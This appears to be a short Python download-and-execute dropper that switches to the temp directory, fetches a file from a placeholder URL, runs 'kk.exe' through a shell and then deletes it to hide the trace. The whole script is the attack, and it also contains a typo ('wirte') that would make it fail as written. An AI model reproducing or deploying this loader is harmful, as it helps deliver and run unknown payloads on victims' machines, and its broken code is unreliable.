#!/usr/bin/env python
import requests, subprocess, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name,'wb') as outfile:
        outfile.wirte(get_response.content)


tmp_directory = tempfile.gettempdir()
os.chdir(tmp_directory)
download("add url here")
result = subprocess.check_output("kk.exe", shell = True)
os.remove("kk.exe")